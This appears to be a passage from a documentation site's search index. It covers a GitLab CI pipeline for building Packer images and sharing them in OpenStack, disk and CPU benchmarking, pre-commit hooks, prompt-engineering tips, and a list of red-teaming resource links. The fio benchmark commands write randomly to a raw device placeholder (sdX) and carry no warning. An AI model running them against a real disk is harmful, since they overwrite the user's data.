https://docs.gitlab.com/ce/ci/docker/using_docker_build.html#use-docker-in-docker-executor</li> <li>TLS for docker-in-docker executor: https://docs.gitlab.com/ee/ci/docker/using_docker_build.html#tls-enabled</li> </ul> <p>Project structure:</p> Bash<pre><code>$PROJECT_ROOT/\n\u251c\u2500\u2500 .gitlab-ci.yml\n\u251c\u2500\u2500 provisioning/\n\u2502   \u2514\u2500\u2500 base/\n\u2502       \u251c\u2500\u2500 img1-ks.cfg\n\u2502       \u251c\u2500\u2500 img2-ks.cfg\n\u2502       \u2514\u2500\u2500 img3-ks.cfg\n\u2502\n\u251c\u2500\u2500 scripts/\n\u2502   \u251c\u2500\u2500 img1/\n\u2502   \u2502   \u2514\u2500\u2500 provision.sh\n\u2502   \u251c\u2500\u2500 img2/\n\u2502   \u2502   \u2514\u2500\u2500 provision.sh\n\u2502   \u2514\u2500\u2500 img3/\n\u2502       \u2514\u2500\u2500 provision.sh\n\u2502\n\u2514\u2500\u2500 templates/\n    \u251c\u2500\u2500 img1.json\n    \u251c\u2500\u2500 img2.json\n    \u2514\u2500\u2500 img3.json\n</code></pre>"},{"location":"content/devops/packerci/#automated-openstack-image-pipeline","title":"Automated OpenStack image pipeline","text":"<p><code>.gitlab-ci.yml</code> contains steps to build, upload and share image to appropriate projects.</p> <p>Composed of stages:</p> <ul> <li>Build Images</li> <li>Upload Images</li> <li>Share Images</li> </ul>"},{"location":"content/devops/packerci/#build-stage","title":"Build stage","text":"<p>The image build CI stage section will build our images.</p> <p>Image build yml:</p> Text Only<pre><code>############################## BUILD JOBS\n\n# This script is not needed, if your container has the following already installed: \n# qemu qemu-img qemu-system-x86_64 qemu-ui-gtk curl jq packer \n.install-qemu-packer: &amp;install-qemu-packer\n    - apk add qemu qemu-img qemu-system-x86_64 qemu-ui-gtk curl jq\n    - echo \"Fetching packer\"\n    - current_version=$(curl -s https://checkpoint-api.hashicorp.com/v1/check/packer | jq -r .current_version)\n    - wget https://releases.hashicorp.com/packer/${current_version}/packer_${current_version}_linux_amd64.zip\n    - unzip packer_${current_version}_linux_amd64.zip\n    - chmod +x packer\n\n.default-build-settings:\n  stage: Build Images\n  tags: \n  - docker-privileged-xl\n  image: docker:19.03.1\n  services:\n  - docker:19.03.1-dind\n  variables:\n      DOCKER_TLS_CERTDIR: \"/certs\"\n  before_script:\n    - *install-qemu-packer\n  artifacts:\n    paths:\n      - images/*/*.qcow2\n    expire_in: 1 week\n\nbuild img1:\n  extends:\n    - .default-build-settings\n  script:\n    - PACKER_LOG=1 ./packer build -force templates/img1.json\n  rules:\n    - changes:\n      - templates/img1.json\n      - provisioning/img1-ks.cfg\n    - when: manual\n</code></pre> <p>The job to build <code>img1</code> is called <code>build img1</code> and is an extension of <code>.default-build-settings</code>. All image build jobs should inherit <code>.default-build-settings</code> because it sets the settings needed for building images in a way which avoids code duplication. To add the same settings to another image job, we just make sure it contains:</p> Text Only<pre><code>  extends:\n    - .default-build-settings\n</code></pre> <p>It will set:</p> <ul> <li>CI stage as <code>Build Images</code></li> <li>CI tag as <code>docker-privileged-xl</code> so that it runs on the correct runner. (Change it to your runners tag)</li> <li>CI image as <code>docker:19.03.1</code> with <code>docker:19.03.1-dind</code> service (Change it to your runner container and service)</li> <li><code>DOCKER_TLS_CERTDIR</code> variable to <code>/certs</code> for docker TLS. (Change it to your TLS path)</li> <li><code>before_script</code> as <code>*install-qemu-packer</code> which installs <code>qemu</code> and the latest <code>packer</code> (This is not needed, if your container has the following already installed: qemu qemu-img qemu-system-x86_64 qemu-ui-gtk curl jq packer)</li> <li>Generated image at <code>images/*/*.qcow2</code> as artifact to be used in corresponding upload image job.</li> </ul> <p>The settings to change for a secific images are:</p> <ul> <li><code>script</code> which should match the json for building the image: <code>PACKER_LOG=1 ./packer build -force templates/&lt;YOUR IMAGE JSON FILE NAME HERE&gt;.json</code> </li> <li><code>rules</code> that should match json and ks.cfg for that image to make sure the pipeline is triggered only when you want. Example only trigger pipeline when the related files are changed or on schecule (See: https://docs.gitlab.com/ee/ci/jobs/job_control.html).  </li> </ul>"},{"location":"content/devops/packerci/#upload-stage","title":"Upload stage","text":"<p>The image upload CI stage section will upload our built images from the previous stage. It will access the image built in the previous stage by using GitLab artifacts that we defined in the inherited settings of <code>.default-build-settings</code>. GitLab doc on artifacts: https://docs.gitlab.com/ee/ci/pipelines/job_artifacts.html</p> <p>For the following to work you need to set some variables for OpenStack authentication. See: https://docs.openstack.org/python-openstackclient/latest/cli/authentication.html</p> <p>These variables are (Change values to fit your environment):</p> Text Only<pre><code># OpenStack Authentication URL \nOS_AUTH_URL: 'https://keystone.cern.ch/v3'\nOS_DEFAULT_DOMAIN: default\n# CERN OpenStack API Version \nOS_IDENTITY_API_VERSION: 3\n# OpenStack Default project to authenticate to\nOS_PROJECT_NAME: \"$UPLOAD_PROJECT_NAME\"\n# OpenStack Default authentication method\n# Password auth requires you to also set secret variables for user and password which are not included here. These would be OS_USERNAME and OS_PASSWORD\nOS_AUTH_TYPE: v3password\n</code></pre> <p>Image upload yml:</p> Text Only<pre><code>############################## UPLOAD JOBS\n\n.openstack-upload-image: &amp;openstack-upload-image\n    - echo \"Getting image name from image path $IMAGE_PATH\" \n    - export IMAGENAME_FULL=$(basename $IMAGE_PATH/*.qcow2)\n    - echo $IMAGENAME_FULL\n    - export IMAGENAME=\"[CICD] ${IMAGENAME_FULL%.*}\"\n    - echo $IMAGENAME\n    - openstack --os-auth-type $OS_AUTH_TYPE image create --disk-format qcow2 --file ./$IMAGE_PATH/\"$IMAGENAME_FULL\" \"$IMAGENAME\"\n    - echo \"IMAGE_TO_SHARE=${IMAGENAME}\" &gt;&gt; img.env\n\n.default-upload-settings:\n  image:\n    name: gitlab-registry.cern.ch/linuxsupport/openstack-client:latest\n    entrypoint: [\"\"]\n  stage: Upload Images\n  script: \n    - *openstack-upload-image\n  artifacts:\n    reports:\n      dotenv: img.env\n\n\nupload img1: \n  extends:\n    - .default-upload-settings\n  needs: [\"build img1\"]\n  dependencies: \n    - build img1\n  variables:\n    IMAGE_PATH: images/img1\n</code></pre> <p>The job to upload <code>img1</code> is called <code>build img1</code> and is an extension of <code>.default-upload-settings</code>. All image upload jobs should inherit <code>.default-upload-settings</code> because it sets the settings needed for uploading images in a way which avoids code duplication. To add the same settings to another image job, we just make sure it contains:</p> Text Only<pre><code>  extends:\n    - .default-upload-settings\n</code></pre> <p>It will set:</p> <ul> <li>CI stage as <code>Upload Images</code></li> <li>CI image to container with OpenStack CLI tools installed.</li> <li><code>script</code> as <code>*openstack-upload-image</code> which uses artifact from corresponding build job that contains the built image and uploads it to the <code>$UPLOAD_PROJECT_NAME</code>.</li> <li>Uploaded image as dotenv variable artifact in <code>img.env</code> that will be used by corresponding share job.</li> </ul> <p>The settings to change for a secific images are:</p> <ul> <li><code>needs</code> which should match your previous build job name wrapped in brackets and quotes: <code>needs: [\"&lt;CORRESPONDING BUILD JOB NAME&gt;\"]</code></li> <li><code>dependencies</code> which should match your previous build.</li> <li><code>variables</code> which should have <code>IMAGE_PATH</code> that matches your images output path set in your image json.</li> </ul>"},{"location":"content/devops/packerci/#share-stage","title":"Share stage","text":"<p>The image share CI stage section will share our built images from the previous stage to projects we need. It will access the image name variable from <code>img.env</code> that we set in the previous stage by using GitLab artifacts that we defined in the inherited settings of <code>.default-upload-settings</code>. GitLab doc on artifacts: https://docs.gitlab.com/ee/ci/pipelines/job_artifacts.html</p> <p>NOTE: The account you use for authenticating to OpenStack projects MUST have permissions to accept the shared image in the project that you want the image to be shared to! The account authenticates and shares the image from <code>$UPLOAD_PROJECT_NAME</code> and then authenticates and accepts it from <code>$PROJECT_TO_SHARE</code>, so it needs access from both sides of this transaction.</p> <p>Sharing images done according to CU doc: https://www.cac.cornell.edu/wiki/index.php?title=Share_An_Image_In_Openstack</p> <p>Image share yml:</p> Text Only<pre><code>############################## SHARE JOBS\n\n.openstack-share-image: &amp;openstack-share-image\n    - |+\n      IFS=';' read -ra PROJECTS &lt;&lt;&lt; \"$PROJECT_TO_SHARE\"\n      while IFS=';' read -ra PROJECTS; do\n        for PROJECT in \"${PROJECTS[@]}\"; do\n          export OS_PROJECT_NAME=$UPLOAD_PROJECT_NAME\n          echo \"Sharing image $IMAGE_TO_SHARE from $OS_PROJECT_NAME to $PROJECT\"\n          export IMG_ID=$(openstack image list | fgrep \"$IMAGE_TO_SHARE\" | cut -d \" \" -f 2)\n          echo \"Got image $IMAGE_TO_SHARE ID: $IMG_ID\"\n          export SHARE_ID=$(openstack project list | fgrep \"$PROJECT\" | cut -d \" \" -f 2)\n          echo \"Got project $PROJECT ID: $SHARE_ID\"\n          openstack --os-auth-type $OS_AUTH_TYPE image set --shared $IMG_ID\n          openstack --os-auth-type $OS_AUTH_TYPE image add project $IMG_ID $SHARE_ID\n          export OS_PROJECT_NAME=$PROJECT\n          echo \"Accepting image share from $PROJECT\"\n          openstack --os-auth-type $OS_AUTH_TYPE image set --accept $IMG_ID \n          export OS_PROJECT_NAME=$UPLOAD_PROJECT_NAME\n        done\n      done &lt;&lt;&lt; \"$PROJECT_TO_SHARE\"\n\n.default-share-settings:\n  image:\n    name: gitlab-registry.cern.ch/linuxsupport/openstack-client:latest\n    entrypoint: [\"\"]\n  stage: Share Images\n  script: \n    - *openstack-share-image\n\n.default-share-on-tag:\n  rules:\n    - if: '$CI_COMMIT_TAG != null'\n      when: manual\n\nshare img1 to dev:\n  extends:\n    - .default-share-settings\n  needs: [\"upload img1\"]\n  dependencies: \n    - upload img1 \n  variables:\n    PROJECT_TO_SHARE: \"$DEV_PROJECT_NAME\"\n\nshare img1 to prod: \n  extends:\n    - .default-share-settings\n    - .default-share-on-tag\n  needs: [\"upload img1\"]\n  dependencies: \n    - upload img1 \n  variables:\n    PROJECT_TO_SHARE: \"$PROD_PROJECT_NAME\"\n</code></pre> <p>The job to share <code>img1</code> is called <code>share img1 to X</code> and is an extension of <code>.default-share-settings</code>. All image share jobs should inherit <code>.default-share-settings</code> because it sets the settings needed for sharing images in a way which avoids code duplication. To add the same settings to another image job, we just make sure it contains:</p> Text Only<pre><code>  extends:\n    - .default-share-settings\n</code></pre> <p>It will set:</p> <ul> <li>CI stage as <code>Share Images</code></li> <li>CI image to container with OpenStack CLI tools installed.</li> <li><code>script</code> as <code>*openstack-share-image</code> which loops over the <code>$PROJECT_TO_SHARE</code> variable values which must be separated by \";\" and shares them from <code>$UPLOAD_PROJECT_NAME</code> to each project value it finds in <code>$PROJECT_TO_SHARE</code>. This allows us to share image to multiple projects without code duplication.</li> </ul> <p>If you wish to have images that are shared only when a tag is commited, then also inherit <code>.default-share-on-tag</code> which sets the rules to only allow this job to run, when a tag is commited. NOTE: with this setup, after commiting a tag, you must still trigger the job manually! Commiting a tag will just make it available.</p> <p>The settings to change for a secific images are:</p> <ul> <li><code>needs</code> which should match your previous upload job name wrapped in brackets and quotes: <code>needs: [\"&lt;CORRESPONDING BUILD JOB NAME&gt;\"]</code></li> <li><code>dependencies</code> which should match your previous upload.</li> <li><code>variables</code> which should have <code>PROJECT_TO_SHARE</code> that points to a variable which has project name(s) separated by \";\", if there are multiple projects.</li> </ul>"},{"location":"content/devops/packerci/#full-pipeline","title":"Full Pipeline","text":"Text Only<pre><code>---\n\nstages:\n  - Build Images\n  - Upload Images\n  - Share Images\n\nvariables:\n  # OpenStack project name to upload images to\n  UPLOAD_PROJECT_NAME: 'BE ACC-linux'\n  # OpenStack project name(s) to share uploaded images to for testing\n  # For multiple names, use \";\" as delimiter\n  DEV_PROJECT_NAME: 'BE-LTS'\n  # OpenStack project name(s) to share uploaded images to for prod\n  # For multiple names, use \";\" as delimiter\n  PROD_PROJECT_NAME: 'BE ACC-VPC2016;Remote Operation Gateway'\n  # CERN OpenStack Authentication URL \n  OS_AUTH_URL: 'https://keystone.cern.ch/v3'\n  OS_DEFAULT_DOMAIN: default\n  # CERN OpenStack API Version\n  OS_IDENTITY_API_VERSION: 3\n  # OpenStack Default project to authenticate to\n  OS_PROJECT_NAME: \"$UPLOAD_PROJECT_NAME\"\n  # OpenStack Default authentication method\n  # Password auth requires you to set CICD variables for user and password\n  OS_AUTH_TYPE: v3password\n\n\n############################## BUILD JOBS\n\n# This script is not needed, if your container has the following already installed: \n# qemu qemu-img qemu-system-x86_64 qemu-ui-gtk curl jq packer \n.install-qemu-packer: &amp;install-qemu-packer\n    - apk add qemu qemu-img qemu-system-x86_64 qemu-ui-gtk curl jq\n    - echo \"Fetching packer\"\n    - current_version=$(curl -s https://checkpoint-api.hashicorp.com/v1/check/packer | jq -r .current_version)\n    - wget https://releases.hashicorp.com/packer/${current_version}/packer_${current_version}_linux_amd64.zip\n    - unzip packer_${current_version}_linux_amd64.zip\n    - chmod +x packer\n\n.default-build-settings:\n  stage: Build Images\n  tags: \n  - docker-privileged-xl\n  image: docker:19.03.1\n  services:\n  - docker:19.03.1-dind\n  variables:\n      DOCKER_TLS_CERTDIR: \"/certs\"\n  before_script:\n    - *install-qemu-packer\n  artifacts:\n    paths:\n      - images/*/*.qcow2\n    expire_in: 1 week\n\nbuild img1:\n  extends:\n    - .default-build-settings\n  script:\n    - PACKER_LOG=1 ./packer build -force templates/img1.json\n  rules:\n    - changes:\n      - templates/img1.json\n      - provisioning/img1-ks.cfg\n    - when: manual\n\n\n############################## UPLOAD JOBS\n\n.openstack-upload-image: &amp;openstack-upload-image\n    - echo \"Getting image name from image path $IMAGE_PATH\" \n    - export IMAGENAME_FULL=$(basename $IMAGE_PATH/*.qcow2)\n    - echo $IMAGENAME_FULL\n    - export IMAGENAME=\"[CICD] ${IMAGENAME_FULL%.*}\"\n    - echo $IMAGENAME\n    - openstack --os-auth-type $OS_AUTH_TYPE image create --disk-format qcow2 --file ./$IMAGE_PATH/\"$IMAGENAME_FULL\" \"$IMAGENAME\"\n    - echo \"IMAGE_TO_SHARE=${IMAGENAME}\" &gt;&gt; img.env\n\n.default-upload-settings:\n  image:\n    name: gitlab-registry.cern.ch/linuxsupport/openstack-client:latest\n    entrypoint: [\"\"]\n  stage: Upload Images\n  script: \n    - *openstack-upload-image\n  artifacts:\n    reports:\n      dotenv: img.env\n\n\nupload img1: \n  extends:\n    - .default-upload-settings\n  needs: [\"build img1\"]\n  dependencies: \n    - build img1\n  variables:\n    IMAGE_PATH: images/img1\n\n\n############################## SHARE JOBS\n\n.openstack-share-image: &amp;openstack-share-image\n    - |+\n      IFS=';' read -ra PROJECTS &lt;&lt;&lt; \"$PROJECT_TO_SHARE\"\n      while IFS=';' read -ra PROJECTS; do\n        for PROJECT in \"${PROJECTS[@]}\"; do\n          export OS_PROJECT_NAME=$UPLOAD_PROJECT_NAME\n          echo \"Sharing image $IMAGE_TO_SHARE from $OS_PROJECT_NAME to $PROJECT\"\n          export IMG_ID=$(openstack image list | fgrep \"$IMAGE_TO_SHARE\" | cut -d \" \" -f 2)\n          echo \"Got image $IMAGE_TO_SHARE ID: $IMG_ID\"\n          export SHARE_ID=$(openstack project list | fgrep \"$PROJECT\" | cut -d \" \" -f 2)\n          echo \"Got project $PROJECT ID: $SHARE_ID\"\n          openstack --os-auth-type $OS_AUTH_TYPE image set --shared $IMG_ID\n          openstack --os-auth-type $OS_AUTH_TYPE image add project $IMG_ID $SHARE_ID\n          export OS_PROJECT_NAME=$PROJECT\n          echo \"Accepting image share from $PROJECT\"\n          openstack --os-auth-type $OS_AUTH_TYPE image set --accept $IMG_ID \n          export OS_PROJECT_NAME=$UPLOAD_PROJECT_NAME\n        done\n      done &lt;&lt;&lt; \"$PROJECT_TO_SHARE\"\n\n.default-share-settings:\n  image:\n    name: gitlab-registry.cern.ch/linuxsupport/openstack-client:latest\n    entrypoint: [\"\"]\n  stage: Share Images\n  script: \n    - *openstack-share-image\n\n.default-share-on-tag:\n  rules:\n    - if: '$CI_COMMIT_TAG != null'\n      when: manual\n\nshare img1 to dev:\n  extends:\n    - .default-share-settings\n  needs: [\"upload img1\"]\n  dependencies: \n    - upload img1 \n  variables:\n    PROJECT_TO_SHARE: \"$DEV_PROJECT_NAME\"\n\nshare img1 to prod: \n  extends:\n    - .default-share-settings\n    - .default-share-on-tag\n  needs: [\"upload img1\"]\n  dependencies: \n    - upload img1 \n  variables:\n    PROJECT_TO_SHARE: \"$PROD_PROJECT_NAME\"\n</code></pre>"},{"location":"content/devops/performance-testing-benchmarking/","title":"Benchmarking and Performance Testing","text":"<p>Info</p> <p>Kubernetes Docs | Cloud Native Landscape | Kubernetes Secrets threat model | Managing Kubernetes without losing your cool</p>"},{"location":"content/devops/performance-testing-benchmarking/#full-suite-testing","title":"Full Suite Testing","text":"<p>Phoronix Test Suite</p> <ol> <li>Find latest Phoronix release</li> <li>Get Phoronix: <code>wget https://github.com/phoronix-test-suite/phoronix-test-suite/releases/download/v10.8.4/phoronix-test-suite-10.8.4.tar.gz</code></li> <li>Unpack: <code>tar -xvzf phoronix-test-suite-10.8.4.tar.gz</code></li> <li>Change directory: <code>cd phoronix-test-suite/</code></li> <li>Install dependencies:</li> <li><code>dnf install php-cli php-xml php-json gd gd-devel</code></li> <li><code>sudo apt-get install php-cli php-xml libgd-dev</code></li> <li>Browse suites at openbenchmarking.org</li> <li>And run them with <code>sh phoronix-test-suite &lt;ARGS&gt;</code></li> </ol> <p>Tests will be saved in <code>~/.phoronix-test-suite/test-results/*</code>. Run <code>sh phoronix-test-suite list-saved-results</code> to list results and then view specific result with <code>sh phoronix-test-suite show-result &lt;RESULT NAME&gt;</code>.</p> <p>Selected tests:</p> <ul> <li> <p>For CPU:</p> Bash<pre><code>sh phoronix-test-suite install compress-7zip mysqlslap openssl redis build-linux-kernel x265 dav1d\n\nsh phoronix-test-suite benchmark compress-7zip mysqlslap openssl redis build-linux-kernel x265 dav1d\n</code></pre> </li> <li> <p>For memory:</p> Bash<pre><code>sh phoronix-test-suite benchmark memory\n</code></pre> </li> <li> <p>For disk:</p> Bash<pre><code>sh phoronix-test-suite benchmark disk\n</code></pre> </li> </ul>"},{"location":"content/devops/performance-testing-benchmarking/#disk-performance-testing-with-fio","title":"Disk performance testing with FIO","text":"<p>Flexible I/O tester docs fio output explained ArsTechnica fio recommended tests</p>"},{"location":"content/devops/performance-testing-benchmarking/#single-4kib-random-write-process","title":"Single 4KiB random write process","text":"<p>This is a single process doing random 4K writes. This is where the pain really, really lives; it's basically the worst possible thing you can ask a disk to do. Where this happens most frequently in real life: copying home directories and dotfiles, manipulating email stuff, some database operations, source code trees.</p> Bash<pre><code>fio --filename=sdX --name=random-write --ioengine=posixaio --rw=randwrite --bs=4k --size=4g --numjobs=1 --iodepth=1 --runtime=60 --time_based --end_fsync=1\n</code></pre>"},{"location":"content/devops/performance-testing-benchmarking/#16-parallel-64kib-random-write-processes","title":"16 parallel 64KiB random write processes","text":"<p>This time, we're creating 16 separate 256MB files (still totaling 4GB, when all put together) and we're issuing 64KB blocksized random write operations. We're doing it with sixteen separate processes running in parallel, and we're queuing up to 16 simultaneous asynchronous ops before we pause and wait for the OS to start acknowledging their receipt. This is a pretty decent approximation of a significantly busy system. It's not doing any one particularly nasty thing\u2014like running a database engine or copying tons of dotfiles from a user's home directory\u2014but it is coping with a bunch of applications doing moderately demanding stuff all at once.</p> <p>This is also a pretty good, slightly pessimistic approximation of a busy, multi-user system like a NAS, which needs to handle multiple 1MB operations simultaneously for different users. If several people or processes are trying to read or write big files (photos, movies, whatever) at once, the OS tries to feed them all data simultaneously. This pretty quickly devolves down to a pattern of multiple random small block access. So in addition to \"busy desktop with lots of apps,\" think \"busy fileserver with several people actively using it.\"</p> Bash<pre><code>fio --filename=sdX --name=random-write --ioengine=posixaio --rw=randwrite --bs=64k --size=256m --numjobs=16 --iodepth=16 --runtime=60 --time_based --end_fsync=1\n</code></pre>"},{"location":"content/devops/performance-testing-benchmarking/#single-1mib-random-write-process","title":"Single 1MiB random write process","text":"<p>This is pretty close to the best-case scenario for a real-world system doing real-world things. No, it's not quite as fast as a single, truly contiguous write... but the 1MiB blocksize is large enough that it's quite close. Besides, if literally any other disk activity is requested simultaneously with a contiguous write, the \"contiguous\" write devolves to this level of performance pretty much instantly, so this is a much more realistic test of the upper end of storage performance on a typical system.</p> <p>You'll see some kooky fluctuations on SSDs when doing this test. This is largely due to the SSD's firmware having better luck or worse luck at any given time, when it's trying to queue operations so that it can write across all physical media stripes cleanly at once. Rust disks will tend to provide a much more consistent, though typically lower, throughput across the run.</p> <p>You can also see SSD performance fall off a cliff here if you exhaust an onboard write cache\u2014TLC and QLC drives tend to have small write cache areas made of much faster MLC or SLC media. Once those get exhausted, the disk has to drop to writing directly to the much slower TLC/QLC media where the data eventually lands. This is the major difference between, for example, Samsung EVO and Pro SSDs\u2014the EVOs have slow TLC media with a fast MLC cache, where the Pros use the higher-performance, higher-longevity MLC media throughout the entire SSD.</p> Bash<pre><code>fio --filename=sdX --name=random-write --ioengine=posixaio --rw=randwrite --bs=1m --size=16g --numjobs=1 --iodepth=1 --runtime=60 --time_based --end_fsync=1\n</code></pre>"},{"location":"content/devops/precommit/","title":"Pre-commit","text":"<p>Git hook scripts are useful for identifying simple issues before submission to code review. By pointing these issues out before code review, this allows a code reviewer to focus on the architecture of a change while not wasting time with trivial style nitpicks because the style is unified before submission.</p>"},{"location":"content/devops/precommit/#installation","title":"Installation","text":"<p>Before you can run hooks, you need to have the pre-commit package manager installed:</p> <p>Install pre-commit to your environment:</p> Bash<pre><code>pip install pre-commit\n</code></pre> <p>In a python project, add the following to your requirements.txt (or requirements-dev.txt):</p> Bash<pre><code>pre-commit\n</code></pre> <p>To set up the git hook scripts in your project:</p> Bash<pre><code>pre-commit install\n</code></pre> <p>(optional) Run against all the files</p> <p>It's usually a good idea to run the hooks against all of the files when adding new hooks so you can see what will change, what the hooks will do etc:</p> Bash<pre><code>pre-commit run --all-files\n</code></pre>"},{"location":"content/devops/precommit/#configuration","title":"Configuration","text":"<ul> <li>create a file named <code>.pre-commit-config.yaml</code></li> <li>you can generate a very basic configuration using the command <code>pre-commit sample-config</code></li> </ul> <p>For accadmlib we used a very basic config that just formats the code using black: </p> Text Only<pre><code>repos:\n- repo: local \n  hooks:\n  - id: black\n    name: black\n    entry: black --verbose \n    language: system\n    types: [python] \n</code></pre> <p>But notice how we didn't use a repository for the black hook, instead we used a local entrypoint that uses the black cli command.</p>"},{"location":"content/devops/prompteng/","title":"Prompt Engineering","text":"<p>Info</p> <p>LLM Bootcamp - Spring 2023 | Prompt Engineering Guide | Microsoft - Prompt engineering techniques | Jailbreak Chat | LLM list with stats | What We\u2019ve Learned From A Year of Building with LLMs</p> <p>From ChatGPT Prompt Engineering for Developers</p>"},{"location":"content/devops/prompteng/#general-tips-for-llms","title":"General tips for LLMs","text":"<ul> <li>Leverage the system-assistant-user role approach. System role is to provide the context to all prompts and the assistant role is to perform the task, user role is you - the one asking the prompts. A system prompt could be something like telling the model to write in some particular style, this prompt can then be inserted into all other prompts for convenience.</li> <li>Different wording for the same prompts can lead to different results. Try to experiment with different wording and see what works best.</li> </ul>"},{"location":"content/devops/prompteng/#guidelines-for-prompting","title":"Guidelines for Prompting","text":""},{"location":"content/devops/prompteng/#write-clear-and-specific-prompts","title":"Write clear and specific prompts","text":"<p>Remember clear and specific does not mean short. In fact longer prompts provide more context, usually leading to better results.</p>"},{"location":"content/devops/prompteng/#tactic-1-use-delimiters-to-clearly-indicate-distinct-parts-of-the-input","title":"Tactic 1: Use delimiters to clearly indicate distinct parts of the input","text":"<ul> <li>Delimiters can be anything like: <code>``, \"\"\", &lt; &gt;,</code> <code>,</code>:`</li> </ul> <p>Using delimiters makes it clear for the model what the input is and what the prompt is. </p> <p>As a side effect it clearly isolates the input from the prompt, making it harder to make prompt injections.</p> <p>Example:</p> Text Only<pre><code>Summarize the text delimited by triple backticks into a single sentence.\n```&lt;TEXT&gt;```\n</code></pre>"},{"location":"content/devops/prompteng/#tactic-2-ask-for-a-structured-output","title":"Tactic 2: Ask for a structured output","text":"<p>Think ahead of time what format the output should be in and ask for it explicitly.</p> <p>Instead of a regular text output, ask for a JSON output with specific keys.</p>"},{"location":"content/devops/prompteng/#tactic-3-ask-the-model-to-check-whether-conditions-are-satisfied","title":"Tactic 3: Ask the model to check whether conditions are satisfied","text":"<p>If the prompt makes assumptions that aren't necessarily satisfied, then we can tell the model to check these assumptions first and then if they're not satisfied, indicate this and kind of stop short of a full task completion attempt. You might also consider potential edge cases and how the model should handle them to avoid unexpected errors or result.</p> <p>Example:</p> Text Only<pre><code>You will be provided with text delimited by triple quotes. \nIf it contains a sequence of instructions, re-write those instructions in the following format:\nStep 1 - ...\nStep 2 - \u2026\n\u2026\nStep N - \u2026\n\nIf the text does not contain a sequence of instructions, then simply write \"No steps provided.\"\n</code></pre>"},{"location":"content/devops/prompteng/#tactic-4-few-shot-prompting","title":"Tactic 4: \"Few-shot\" prompting","text":"<p>Few-shot prompting is just providing examples of successful executions of the task you want performed before asking the model to do the actual task you want it to do.</p> Text Only<pre><code>Your task is to answer in a consistent style.\n\n&lt;child&gt;: Teach me about patience.\n\n&lt;grandparent&gt;: The river that carves the deepest \\ \nvalley flows from a modest spring; the \\ \ngrandest symphony originates from a single note; \\ \nthe most intricate tapestry begins with a solitary thread.\n\n&lt;child&gt;: Teach me about resilience.\n</code></pre>"},{"location":"content/devops/prompteng/#give-the-model-time-to-think","title":"Give the model time to \"think\"","text":"<p>If a model is making reasoning errors by rushing to an incorrect conclusion, try reframing the query to request a chain or series of relevant reasoning before the model provides its final answer. Another way to think about this is that if you give a model a task that's too complex for it to do in a short amount of time or in a small number of words, it may make up a guess which is likely to be incorrect.</p> <p>In these situations, you can instruct the model to think more about the problem and to provide more context for the model to make its final decision. It also means it will be spending more computational effort on the task. Or you can ask the model to provide a series of intermediate steps before it provides its final answer.</p>"},{"location":"content/devops/prompteng/#tactic-1-specify-the-steps-required-to-complete-a-task","title":"Tactic 1: Specify the steps required to complete a task","text":"<p>First tactic is to give a step by step list of instructions for the model to follow.</p> <p>Break down each step into smaller and smaller steps until the model can reach the correct final output.</p>"},{"location":"content/devops/prompteng/#tactic-2-instruct-the-model-to-work-out-its-own-solution-before-rushing-to-a-conclusion","title":"Tactic 2: Instruct the model to work out its own solution before rushing to a conclusion","text":"<p>Another tactic is to ask the model to work out its own solution before rushing to a conclusion. </p> <p>This is especially useful for checking output from other sources, like trying to grade the answers of a student. In these cases models usually rush to agreeing with the source, even if the source is wrong. Instructing the model to work out its own solution first and then compare it to the source can help avoid this.</p>"},{"location":"content/devops/prompteng/#summarizing","title":"Summarizing","text":"<p>One of the strongest use cases for LLMs is summarization.</p>"},{"location":"content/devops/prompteng/#summarize-with-a-wordsentencecharacter-limit","title":"Summarize with a word/sentence/character limit","text":"<p>LLMs can vary in the length of the output they produce. In some times they try to fit as much of the context as possible, other times they try to be too concise. </p> <p>Specifying a word/sentence/character limit can help the model produce the consistent desired output length.</p> <p>Note: LLMs usually can't really count, so it might not follow the limit exactly, but it will usually be close enough and definitely helps.</p>"},{"location":"content/devops/prompteng/#summarize-with-a-focus-on-a-specific-topic","title":"Summarize with a focus on a specific topic","text":"<p>At times we are summarizing a text with the purpose of getting something specific out of it. In these cases we can tell the model to focus on a specific topic.</p>"},{"location":"content/devops/prompteng/#try-extract-instead-of-summarize","title":"Try \"extract\" instead of \"summarize\"","text":"<p>To really nail down the last tip, you can try to extract it instead of summarizing it.</p>"},{"location":"content/devops/prompteng/#inferring","title":"Inferring","text":"<p>Inferring is when we perform some kind of deeper analysis on the input text. In addition to extracting clear information from the text, we can also infer information that is not explicitly stated in the text.</p>"},{"location":"content/devops/prompteng/#identify-sentiment-positivenegative","title":"Identify sentiment (positive/negative)","text":"<p>Ask the LLM to identify the sentiment of the input text. It can be positive, negative or neutral.</p>"},{"location":"content/devops/prompteng/#identify-types-of-emotions","title":"Identify types of emotions","text":"<p>Ask the LLM to identify the types of emotions in the input text. It can be anything from anger, disgust, fear, joy, sadness, surprise or neutral. Ask for specifics.</p>"},{"location":"content/devops/prompteng/#extract-key-information","title":"Extract key information","text":"<p>The text may not explicitly mention how key information relates to each other. For example a review of a product may mention the product name, price and manufacturer in different parts of the text. We can ask the LLM to infer the relationship between these key information.</p>"},{"location":"content/devops/prompteng/#transforming","title":"Transforming","text":"<p>LLMs are very good at transforming its input to a different format, such as inputting a piece of text in one language and transforming it or translating it to a different language, or helping with spelling and grammar corrections, so taking as input a piece of text that may not be fully grammatical and helping you to fix that up a bit, or even transforming formats such as inputting HTML and outputting JSON.</p>"},{"location":"content/devops/prompteng/#translation","title":"Translation","text":"<p>LLMs are trained on a lot of text from kind of many sources, a lot of which is the internet, and this is kind of, of course, in many different languages. So this kind of imbues the model with the ability to do translation. And these models know kind of hundreds of languages to varying degrees of proficiency.</p> <p>Note that how good the translation is depends on the data the model was trained on.</p>"},{"location":"content/devops/prompteng/#tone-transformation","title":"Tone Transformation","text":"<p>You can ask the model to transform the tone of the text. From slang to formal, from formal to casual or to also include emotions.</p>"},{"location":"content/devops/prompteng/#format-conversion","title":"Format Conversion","text":"<p>LLMs can convert between different formats. For example, converting HTML to JSON to XML, etc.</p>"},{"location":"content/devops/prompteng/#spellgrammar-check","title":"Spell/Grammar check","text":"<p>LLMs can help with spelling and grammar corrections and for the most part they do a very good job, but they're not perfect. So you should always double check the output.</p>"},{"location":"content/devops/redteaming/","title":"Red Teaming","text":"<p>Info</p> <p>PayloadsAllTheThings | CyberChef | SecLists | IPPSEC knowledgebase</p>"},{"location":"content/devops/redteaming/#learning-resources","title":"Learning Resources","text":"<ul> <li>ITI0216 or ITI0103 courses at TalTech which use many RangeForce labs to go over all essential RedTeaming techniques.</li> <li>Hack The Box</li> <li>IppSec YouTube Channel - HtB walkthroughs and explanations</li> 